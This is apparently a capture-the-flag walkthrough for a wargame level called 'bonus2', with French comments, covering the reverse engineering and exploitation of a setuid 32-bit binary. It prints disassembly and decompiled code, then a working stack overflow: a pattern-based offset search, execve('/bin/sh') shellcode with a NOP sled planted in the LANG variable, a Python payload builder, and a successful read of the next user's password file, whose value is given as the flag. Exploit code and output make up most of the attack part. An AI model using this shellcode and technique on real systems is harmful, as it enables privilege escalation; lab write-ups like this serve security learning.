# bonus2

```bash
$ ls -l
total 8
-rwsr-s---+ 1 bonus3 users 5664 Mar  6  2016 bonus2
$ file bonus2
bonus2: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf71cccc3c27dfb47071bb0bc981e2dae92a47844, not stripped
$ gdb -q ./bonus2
Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048318  _init
0x08048360  memcmp
0x08048360  memcmp@plt
0x08048370  strcat
0x08048370  strcat@plt
0x08048380  getenv
0x08048380  getenv@plt
0x08048390  puts
0x08048390  puts@plt
0x080483a0  __gmon_start__
0x080483a0  __gmon_start__@plt
0x080483b0  __libc_start_main
0x080483b0  __libc_start_main@plt
0x080483c0  strncpy
0x080483c0  strncpy@plt
0x080483d0  _start
0x08048400  __do_global_dtors_aux
0x08048460  frame_dummy
0x08048484  greetuser
0x08048529  main
0x08048640  __libc_csu_init
0x080486b0  __libc_csu_fini
0x080486b2  __i686.get_pc_thunk.bx
0x080486c0  __do_global_ctors_aux
0x080486ec  _fini
(gdb) disas main
Dump of assembler code for function main:
   0x08048529 <+0>:     push   %ebp
   0x0804852a <+1>:     mov    %esp,%ebp
   0x0804852c <+3>:     push   %edi
   0x0804852d <+4>:     push   %esi
   0x0804852e <+5>:     push   %ebx
   0x0804852f <+6>:     and    $0xfffffff0,%esp
   0x08048532 <+9>:     sub    $0xa0,%esp
   0x08048538 <+15>:    cmpl   $0x3,0x8(%ebp)
   0x0804853c <+19>:    je     0x8048548 <main+31>
   0x0804853e <+21>:    mov    $0x1,%eax
   0x08048543 <+26>:    jmp    0x8048630 <main+263>
   0x08048548 <+31>:    lea    0x50(%esp),%ebx
   0x0804854c <+35>:    mov    $0x0,%eax
   0x08048551 <+40>:    mov    $0x13,%edx
   0x08048556 <+45>:    mov    %ebx,%edi
   0x08048558 <+47>:    mov    %edx,%ecx
   0x0804855a <+49>:    rep stos %eax,%es:(%edi)
   0x0804855c <+51>:    mov    0xc(%ebp),%eax
   0x0804855f <+54>:    add    $0x4,%eax
   0x08048562 <+57>:    mov    (%eax),%eax
   0x08048564 <+59>:    movl   $0x28,0x8(%esp)
   0x0804856c <+67>:    mov    %eax,0x4(%esp)
   0x08048570 <+71>:    lea    0x50(%esp),%eax
   0x08048574 <+75>:    mov    %eax,(%esp)
   0x08048577 <+78>:    call   0x80483c0 <strncpy@plt>
   0x0804857c <+83>:    mov    0xc(%ebp),%eax
   0x0804857f <+86>:    add    $0x8,%eax
   0x08048582 <+89>:    mov    (%eax),%eax
   0x08048584 <+91>:    movl   $0x20,0x8(%esp)
   0x0804858c <+99>:    mov    %eax,0x4(%esp)
   0x08048590 <+103>:   lea    0x50(%esp),%eax
   0x08048594 <+107>:   add    $0x28,%eax
   0x08048597 <+110>:   mov    %eax,(%esp)
   0x0804859a <+113>:   call   0x80483c0 <strncpy@plt>
   0x0804859f <+118>:   movl   $0x8048738,(%esp)
   0x080485a6 <+125>:   call   0x8048380 <getenv@plt>
   0x080485ab <+130>:   mov    %eax,0x9c(%esp)
   0x080485b2 <+137>:   cmpl   $0x0,0x9c(%esp)
   0x080485ba <+145>:   je     0x8048618 <main+239>
   0x080485bc <+147>:   movl   $0x2,0x8(%esp)
   0x080485c4 <+155>:   movl   $0x804873d,0x4(%esp)
   0x080485cc <+163>:   mov    0x9c(%esp),%eax
   0x080485d3 <+170>:   mov    %eax,(%esp)
   0x080485d6 <+173>:   call   0x8048360 <memcmp@plt>
   0x080485db <+178>:   test   %eax,%eax
   0x080485dd <+180>:   jne    0x80485eb <main+194>
   0x080485df <+182>:   movl   $0x1,0x8049988
   0x080485e9 <+192>:   jmp    0x8048618 <main+239>
   0x080485eb <+194>:   movl   $0x2,0x8(%esp)
   0x080485f3 <+202>:   movl   $0x8048740,0x4(%esp)
   0x080485fb <+210>:   mov    0x9c(%esp),%eax
   0x08048602 <+217>:   mov    %eax,(%esp)
   0x08048605 <+220>:   call   0x8048360 <memcmp@plt>
   0x0804860a <+225>:   test   %eax,%eax
   0x0804860c <+227>:   jne    0x8048618 <main+239>
   0x0804860e <+229>:   movl   $0x2,0x8049988
   0x08048618 <+239>:   mov    %esp,%edx
   0x0804861a <+241>:   lea    0x50(%esp),%ebx
   0x0804861e <+245>:   mov    $0x13,%eax
   0x08048623 <+250>:   mov    %edx,%edi
   0x08048625 <+252>:   mov    %ebx,%esi
   0x08048627 <+254>:   mov    %eax,%ecx
   0x08048629 <+256>:   rep movsl %ds:(%esi),%es:(%edi)
   0x0804862b <+258>:   call   0x8048484 <greetuser>
   0x08048630 <+263>:   lea    -0xc(%ebp),%esp
   0x08048633 <+266>:   pop    %ebx
   0x08048634 <+267>:   pop    %esi
   0x08048635 <+268>:   pop    %edi
   0x08048636 <+269>:   pop    %ebp
   0x08048637 <+270>:   ret
End of assembler dump.
(gdb) disas greetuser
Dump of assembler code for function greetuser:
   0x08048484 <+0>:     push   %ebp
   0x08048485 <+1>:     mov    %esp,%ebp
   0x08048487 <+3>:     sub    $0x58,%esp
   0x0804848a <+6>:     mov    0x8049988,%eax
   0x0804848f <+11>:    cmp    $0x1,%eax
   0x08048492 <+14>:    je     0x80484ba <greetuser+54>
   0x08048494 <+16>:    cmp    $0x2,%eax
   0x08048497 <+19>:    je     0x80484e9 <greetuser+101>
   0x08048499 <+21>:    test   %eax,%eax
   0x0804849b <+23>:    jne    0x804850a <greetuser+134>
   0x0804849d <+25>:    mov    $0x8048710,%edx
   0x080484a2 <+30>:    lea    -0x48(%ebp),%eax
   0x080484a5 <+33>:    mov    (%edx),%ecx
   0x080484a7 <+35>:    mov    %ecx,(%eax)
   0x080484a9 <+37>:    movzwl 0x4(%edx),%ecx
   0x080484ad <+41>:    mov    %cx,0x4(%eax)
   0x080484b1 <+45>:    movzbl 0x6(%edx),%edx
   0x080484b5 <+49>:    mov    %dl,0x6(%eax)
   0x080484b8 <+52>:    jmp    0x804850a <greetuser+134>
   0x080484ba <+54>:    mov    $0x8048717,%edx
   0x080484bf <+59>:    lea    -0x48(%ebp),%eax
   0x080484c2 <+62>:    mov    (%edx),%ecx
   0x080484c4 <+64>:    mov    %ecx,(%eax)
   0x080484c6 <+66>:    mov    0x4(%edx),%ecx
   0x080484c9 <+69>:    mov    %ecx,0x4(%eax)
   0x080484cc <+72>:    mov    0x8(%edx),%ecx
   0x080484cf <+75>:    mov    %ecx,0x8(%eax)
   0x080484d2 <+78>:    mov    0xc(%edx),%ecx
   0x080484d5 <+81>:    mov    %ecx,0xc(%eax)
   0x080484d8 <+84>:    movzwl 0x10(%edx),%ecx
   0x080484dc <+88>:    mov    %cx,0x10(%eax)
   0x080484e0 <+92>:    movzbl 0x12(%edx),%edx
   0x080484e4 <+96>:    mov    %dl,0x12(%eax)
   0x080484e7 <+99>:    jmp    0x804850a <greetuser+134>
   0x080484e9 <+101>:   mov    $0x804872a,%edx
   0x080484ee <+106>:   lea    -0x48(%ebp),%eax
   0x080484f1 <+109>:   mov    (%edx),%ecx
   0x080484f3 <+111>:   mov    %ecx,(%eax)
   0x080484f5 <+113>:   mov    0x4(%edx),%ecx
   0x080484f8 <+116>:   mov    %ecx,0x4(%eax)
   0x080484fb <+119>:   mov    0x8(%edx),%ecx
   0x080484fe <+122>:   mov    %ecx,0x8(%eax)
   0x08048501 <+125>:   movzwl 0xc(%edx),%edx
   0x08048505 <+129>:   mov    %dx,0xc(%eax)
   0x08048509 <+133>:   nop
   0x0804850a <+134>:   lea    0x8(%ebp),%eax
   0x0804850d <+137>:   mov    %eax,0x4(%esp)
   0x08048511 <+141>:   lea    -0x48(%ebp),%eax
   0x08048514 <+144>:   mov    %eax,(%esp)
   0x08048517 <+147>:   call   0x8048370 <strcat@plt>
   0x0804851c <+152>:   lea    -0x48(%ebp),%eax
   0x0804851f <+155>:   mov    %eax,(%esp)
   0x08048522 <+158>:   call   0x8048390 <puts@plt>
   0x08048527 <+163>:   leave
   0x08048528 <+164>:   ret
End of assembler dump.
```

```bash
# Decompile main
undefined4 main(int param_1,int param_2)
{
  undefined4 uVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  byte bVar5;
  undefined4 local_60 [10];
  char acStack_38 [36];
  char *local_14;

  bVar5 = 0;
  if (param_1 == 3) {
    puVar3 = local_60;
    for (iVar2 = 0x13; iVar2 != 0; iVar2 = iVar2 + -1) {
      *puVar3 = 0;
      puVar3 = puVar3 + 1;
    }
    strncpy((char *)local_60,*(char **)(param_2 + 4),0x28); # Copy 40
    strncpy(acStack_38,*(char **)(param_2 + 8),0x20);
    local_14 = getenv("LANG");
    if (local_14 != (char *)0x0) {
      iVar2 = memcmp(local_14,&DAT_0804873d,2);
      if (iVar2 == 0) {
        language = 1;
      }
      else {
        iVar2 = memcmp(local_14,&DAT_08048740,2);
        if (iVar2 == 0) {
          language = 2;
        }
      }
    }
    puVar3 = local_60;
    puVar4 = (undefined4 *)&stack0xffffff50;
    for (iVar2 = 0x13; iVar2 != 0; iVar2 = iVar2 + -1) {
      *puVar4 = *puVar3;
      puVar3 = puVar3 + (uint)bVar5 * -2 + 1;
      puVar4 = puVar4 + (uint)bVar5 * -2 + 1;
    }
    uVar1 = greetuser();
  }
  else {
    uVar1 = 1;
  }
  return uVar1;
}

# Decompile greetuser
void greetuser(void)
{
  undefined4 local_4c;
  undefined4 local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined2 local_3c;
  undefined local_3a;

  if (language == 1) {
    local_4c._0_1_ = 'H';
    local_4c._1_1_ = 'y';
    local_4c._2_1_ = 'v';
    local_4c._3_1_ = -0x3d;
    local_48._0_1_ = -0x5c;
    local_48._1_1_ = -0x3d;
    local_48._2_1_ = -0x5c;
    local_48._3_1_ = ' ';
    local_44._0_1_ = 'p';
    local_44._1_1_ = -0x3d;
    local_44._2_1_ = -0x5c;
    local_44._3_1_ = 'i';
    local_40 = 0xc3a4c376;
    local_3c = 0x20a4;
    local_3a = 0;
  }
  else if (language == 2) {
    local_4c._0_1_ = 'G';
    local_4c._1_1_ = 'o';
    local_4c._2_1_ = 'e';
    local_4c._3_1_ = 'd';
    local_48._0_1_ = 'e';
    local_48._1_1_ = 'm';
    local_48._2_1_ = 'i';
    local_48._3_1_ = 'd';
    local_44._0_1_ = 'd';
    local_44._1_1_ = 'a';
    local_44._2_1_ = 'g';
    local_44._3_1_ = '!';
    local_40 = CONCAT22(local_40._2_2_,0x20);
  }
  else if (language == 0) {
    local_4c._0_1_ = 'H';
    local_4c._1_1_ = 'e';
    local_4c._2_1_ = 'l';
    local_4c._3_1_ = 'l';
    local_48._0_3_ = 0x206f;
  }
  strcat((char *)&local_4c,&stack0x00000004);
  puts((char *)&local_4c);
  return;
}
```

```bash
$ export LANG=fi
# pattern generator https://wiremask.eu/tools/buffer-overflow-pattern-generator/
$ gdb -q ./bonus2
Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.
# Le premier arg est inutile (il doit juste d'etre d'au moins 40 char)
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Starting program: /home/user/bonus2/bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Hyvää päivää Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2AAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x41366141 in ?? ()
# Offset de 18
```

```bash
# On export dans le env notre shellcode
$ export LANG=$(python -c 'print("fi" + "\x90" * 100 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")')
# On doit trouver l'adresse du buffer ou est la variable d'environment
$ gdb -q ./bonus2
Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.
(gdb) b getenv
Breakpoint 1 at 0x8048380
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A ARG
Starting program: /home/user/bonus2/bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A ARG

Breakpoint 1, 0xb7e5e1d0 in getenv () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/20s *((char**)environ)
0xbffff897:      "SHELL=/bin/bash"
...
0xbffffe9c:      "PWD=/home/user/bonus2"
0xbffffeb2:      "LANG=fi\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\311\367\341\260\vQh//shh/bin\211\343\315\200"
...
(gdb)
```

```bash
$ nano /tmp/exploit.py
payload1 = b"A" * 40

with open("/tmp/payload1.txt", "wb") as f:
        f.write(payload1)

buffer_addr = "\xb2\xfe\xff\xbf"
# offset + adresse du buffer (LANG)
payload2 = b"A" * 18 + buffer_addr

with open("/tmp/payload2.txt", "wb") as f:
        f.write(payload2)

print("Payload usage: ./bonus2 $(cat /tmp/payload1.txt) $(cat /tmp/payload2.txt)")

$ python /tmp/exploit.py
Payload usage: ./bonus2 $(cat /tmp/payload1.txt) $(cat /tmp/payload2.txt)
$ ./bonus2 $(cat /tmp/payload1.txt) $(cat /tmp/payload2.txt)
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

FLAG: `71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587`
